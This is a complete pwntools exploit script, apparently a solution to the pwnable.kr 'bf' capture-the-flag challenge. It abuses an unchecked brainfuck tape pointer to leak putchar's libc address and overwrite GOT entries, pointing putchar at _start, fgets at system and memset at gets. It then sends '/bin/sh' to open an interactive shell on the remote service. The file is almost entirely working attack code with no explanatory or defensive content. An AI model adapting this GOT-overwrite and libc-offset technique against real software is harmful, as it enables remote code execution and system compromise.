from pwn import *

context.clear(arch='i386', log_level='critical')

def pack(addr):
	i = struct.pack('<I', addr)
	return i

def unpack(addr):
	i = struct.unpack('<I', addr)
	return i[0]

def mov_ptr(offset):
	if offset > 0:
		return '>' * offset
	else:
		return '<' * abs(offset)

p = remote('pwnable.kr', 9001)
# p = process('./bf')
libc = ELF('./bf_libc.so')
bf = ELF('./bf')

p_pointer = 0x804a0a0

fgets_got_entry		= bf.got['fgets']
putchar_got_entry	= bf.got['putchar']
memset_got_entry	= bf.got['memset']

putchar_p_offset 	= putchar_got_entry - p_pointer

_start					= 0x80484e0
system_putchar_offset	= libc.symbols['system'] - libc.symbols['putchar']
gets_putchar_offset		= libc.symbols['gets'] - libc.symbols['putchar']

p.recvuntil(']\n')

msg =  ''

# putchar -> _start
msg += mov_ptr(putchar_p_offset) 					# shift to putchar@got
msg += '.'
msg += '.>' * 4 + '<' * 4							# read putchar position and go back
msg += ',>' * 4 + '<' * 4							# replace address and go back

# fgets -> system
msg += mov_ptr(fgets_got_entry - putchar_got_entry) # go to fgets@got position
msg += ',>' * 4 + '<' * 4							# replace address and go back

# memset -> gets
msg += mov_ptr(memset_got_entry - fgets_got_entry) 	# go to memset@got position
msg += ',>' * 4 									# replace address

# call putchar
msg += '.'

if len(msg) > 512:
	print '[ERROR] msg len=%d' % len(msg)
	exit()

p.sendline(msg)

p.recv(1)
putchar_addr	= unpack(p.recvn(numb=4))
system_addr		= putchar_addr + system_putchar_offset
gets_addr		= putchar_addr + gets_putchar_offset

p.send(pack(_start))
p.send(pack(system_addr))
p.send(pack(gets_addr))
p.sendline('/bin/sh\x00')

p.recvuntil(']\n')
p.interactive()
